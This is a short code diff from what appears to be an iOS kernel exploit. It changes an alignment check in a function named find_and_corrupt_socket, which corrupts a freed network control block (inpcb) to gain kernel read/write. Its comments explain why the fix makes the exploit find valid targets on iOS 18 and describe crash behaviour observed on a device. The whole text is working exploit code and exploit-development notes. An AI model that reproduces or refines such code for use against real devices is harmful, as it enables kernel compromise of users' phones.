@@ -506,9 +506,12 @@ int find_and_corrupt_socket(mach_port_t memObj, mach_vm_offset_t seekOff,
     // inpcb was freed, the first 0x20-byte KRW write through set_kaddr()
     // corrupts the MAC label zone -> ZBC panic (observed on-device).
     // We cannot read PCB B's gencnt here (KRW not established yet), so we
-    // enforce a strict shape check (page-aligned kernel heap) and keep the
-    // socket that backs it alive for the whole process lifetime.
-    if ((inpNext & 0xfff) != 0 || (inpNext >> 40) != 0xFFFFFF) {
+    // enforce a shape check (kernel-heap range + kalloc.1024 alignment) and
+    // keep the socket that backs it alive for the whole process lifetime.
+    // NOTE: inpcb comes from kalloc.1024, so it is 0x400-aligned, NOT
+    // page-aligned. A 0x1000 page-alignment test (as originally written)
+    // rejects every valid candidate on iOS 18 (observed on-device).
+    if ((inpNext & 0x3ff) != 0 || (inpNext >> 40) != 0xFFFFFF) {
         printf("[-] PCB B rejected: not kernel heap/aligned 0x%llx\n", inpNext);
         return -1;
     }
